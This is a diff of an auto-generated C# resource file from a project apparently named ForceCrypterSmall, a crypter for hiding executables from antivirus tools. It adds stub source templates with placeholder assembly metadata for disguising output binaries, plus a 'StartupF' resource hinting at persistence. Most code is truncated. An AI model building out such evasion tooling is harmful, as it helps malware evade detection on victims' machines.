@@ -70,13 +70,14 @@ namespace ForceCrypterSmall.Properties {
         ///using System.Windows.Forms;
         ///using System.Runtime.InteropServices;
         ///using System.Security.Cryptography;
-        ///
+        ///using System.Diagnostics;
+        ///using System.ComponentModel;
+        ///using System.Text;
         ///[assembly: AssemblyTitle(&quot;[title-replace]&quot;)]
         ///[assembly: AssemblyDescription(&quot;[desc-replace]&quot;)]
         ///[assembly: AssemblyCompany(&quot;[company-replace]&quot;)]
         ///[assembly: AssemblyProduct(&quot;[product-replace]&quot;)]
-        ///[assembly: AssemblyCopyright(&quot;[copyright-replace]&quot;)]
-        ///[assembly: AssemblyTr [rest of string was truncated]&quot;;.
+        /// [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string boop {
             get {
@@ -85,11 +86,40 @@ namespace ForceCrypterSmall.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to .
+        ///   Looks up a localized string similar to using Microsoft.Win32;
+        ///using System;
+        ///using System.IO;
+        ///using System.Reflection;
+        ///using System.Resources;
+        ///using System.Threading;
+        ///using System.Windows.Forms;
+        ///using System.Runtime.InteropServices;
+        ///using System.Security.Cryptography;
+        ///using System.Diagnostics;
+        ///using Timer = System.Timers.Timer;
+        ///
+        ///namespace fuckcancercode
+        ///{
+        ///    static class Program
+        ///    {
+        ///        [STAThread]
+        ///        static void Main()
+        ///        {
+        ///            Application.EnableVisualStyles();
+        ///            Application.SetCompatibleTex [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string doop {
             get {
                 return ResourceManager.GetString("doop", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to .
+        /// </summary>
+        internal static string StartupF {
+            get {
+                return ResourceManager.GetString("StartupF", resourceCulture);
             }
         }
     }
